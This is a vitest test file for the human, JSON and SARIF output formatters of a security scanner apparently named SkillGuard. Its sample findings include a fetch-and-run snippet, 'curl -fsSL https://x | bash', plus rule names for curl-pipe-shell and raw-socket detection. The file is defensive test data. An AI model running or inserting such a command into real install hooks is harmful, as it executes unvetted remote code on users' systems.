import { describe, it, expect } from 'vitest';
import { formatHuman, formatJson, formatSarif, JsonOutputSchema, toJsonOutput } from './formatters';
import type { ScanResult } from '../types';

const SAMPLE_RESULT: ScanResult = {
  target: '/tmp/some-skill',
  findings: [
    {
      ruleId: 'sg02-curl-pipe-shell',
      category: 'SG02',
      severity: 'HIGH',
      message: 'Piping a remote download directly into a shell interpreter.',
      file: 'hooks/install.sh',
      line: 3,
      snippet: 'curl -fsSL https://x | bash',
    },
    {
      ruleId: 'sg01-raw-socket-python',
      category: 'SG01',
      severity: 'MEDIUM',
      message: 'Raw socket creation.',
      file: 'hooks/backdoor.py',
      line: 5,
    },
  ],
  timeouts: ['hooks/slow.py'],
  unscannedFiles: ['hooks/tool.rb'],
  warnings: [{ code: 'invalid-pack', message: 'WHAT: x\nWHY: y\nFIX: z' }],
  filesScanned: 3,
  severityThreshold: 'HIGH',
  exitCode: 1,
};

describe('output/formatters', () => {
  it('human format includes each finding with severity, category, file:line, and rule id', () => {
    const text = formatHuman(SAMPLE_RESULT);
    expect(text).toContain('[HIGH] SG02 hooks/install.sh:3');
    expect(text).toContain('sg02-curl-pipe-shell');
    expect(text).toContain('[MEDIUM] SG01 hooks/backdoor.py:5');
    expect(text).toContain('[TIMEOUT]');
    expect(text).toContain('hooks/slow.py');
    expect(text).toContain('hooks/tool.rb');
    expect(text).toContain('exit code 1');
  });

  it('human format reports "No findings." on a clean result', () => {
    const clean: ScanResult = { ...SAMPLE_RESULT, findings: [], timeouts: [], warnings: [], exitCode: 0 };
    expect(formatHuman(clean)).toContain('No findings.');
  });

  it('json format matches the schema-validated shape', () => {
    const json = formatJson(SAMPLE_RESULT);
    const parsed = JSON.parse(json);
    const validation = JsonOutputSchema.safeParse(parsed);
    expect(validation.success).toBe(true);
    expect(parsed.summary).toEqual({ HIGH: 1, MEDIUM: 1, LOW: 0 });
    expect(parsed.findings).toHaveLength(2);
  });

  it('toJsonOutput() output independently validates against JsonOutputSchema', () => {
    const output = toJsonOutput(SAMPLE_RESULT);
    expect(() => JsonOutputSchema.parse(output)).not.toThrow();
  });

  it('sarif format produces a valid SARIF 2.1.0 document', () => {
    const sarif = JSON.parse(formatSarif(SAMPLE_RESULT));
    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs).toHaveLength(1);
    expect(sarif.runs[0].tool.driver.name).toBe('SkillGuard');
    expect(sarif.runs[0].results).toHaveLength(2);

    const highResult = sarif.runs[0].results.find((r: { ruleId: string }) => r.ruleId === 'sg02-curl-pipe-shell');
    expect(highResult.level).toBe('error'); // HIGH -> error
    expect(highResult.locations[0].physicalLocation.artifactLocation.uri).toBe('hooks/install.sh');
    expect(highResult.locations[0].physicalLocation.region.startLine).toBe(3);

    const mediumResult = sarif.runs[0].results.find((r: { ruleId: string }) => r.ruleId === 'sg01-raw-socket-python');
    expect(mediumResult.level).toBe('warning'); // MEDIUM -> warning
  });
});
